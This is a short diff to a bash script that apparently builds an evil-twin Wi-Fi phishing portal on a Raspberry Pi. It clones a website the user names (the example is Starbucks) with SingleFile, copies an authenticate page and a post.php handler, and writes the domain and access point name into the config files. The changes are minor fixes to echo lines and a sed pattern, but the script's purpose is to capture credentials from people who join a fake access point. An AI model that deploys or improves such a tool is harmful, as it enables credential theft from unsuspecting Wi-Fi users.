@@ -49,13 +49,14 @@ echo ""
 echo -e ${green}"Enter Website URL To Clone. Example: https://www.starbucks.com"${clear}
 echo ""
 read URL
+echo ""
 echo -e ${yellow}"Cloning $URL"${clear}
 echo ""
 systemctl stop dnsmasq
 /usr/bin/chromium-browser --no-sandbox 2>/dev/null
 runuser -u pi -- ./SingleFile/cli/single-file $URL --browser-executable-path=/usr/bin/chromium-browser /home/pi/index.html
 echo ""
-echo ${yellow}"Cloning finished"${clear}
+echo -e ${yellow}"Cloning finished"${clear}
 echo ""
 sleep 1
 echo -e ${yellow}"$URL Cloned Successfully"${clear}
@@ -71,7 +72,7 @@ cp Resources/authenticate.html . 2>/dev/null
 cp Resources/post.php . 2>/dev/null
 
 #Replacing Variables In Files
-sed -i "s/domain/${domain}g/" post.php
+sed -i "s/domain/${domain}/g" post.php
 sed -i "s/domain/${domain}/g" index.html
 #sed -i "s/domain/${domain}/g" dnsmasq.conf
 sed -i "s/AP/${AP}/g" hostapd.conf
